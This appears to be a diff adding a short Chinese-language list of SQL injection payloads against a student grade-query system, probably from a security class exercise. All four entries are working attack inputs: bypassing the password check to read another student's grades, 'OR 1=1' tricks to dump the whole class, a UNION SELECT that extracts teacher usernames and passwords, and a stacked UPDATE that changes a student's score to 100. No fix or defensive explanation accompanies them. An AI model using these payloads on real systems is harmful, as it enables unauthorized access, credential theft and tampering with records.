@@ -1,0 +1,17 @@
+漏洞1.查詢他人成績，在不知道密碼的情況下(舉例查學生2)
+S002' #
+
+漏洞2.查詢全班成績
+<法一>
+帳號：'OR 1=1 #
+密碼：任意值
+<法二>
+帳號：任意值' OR '1' = '1  
+密碼：任意值' OR '1' = '1
+
+漏洞3.取得老師帳號密碼
+' UNION SELECT 1, 2, 3, username, password, 999 FROM userTable WHERE role='teacher' #
+
+//漏洞4.竄改他人成績(舉例把學生1成績改為100)
+S001'; UPDATE scoreTable SET score = 100 WHERE studentId = 'S001' #
+
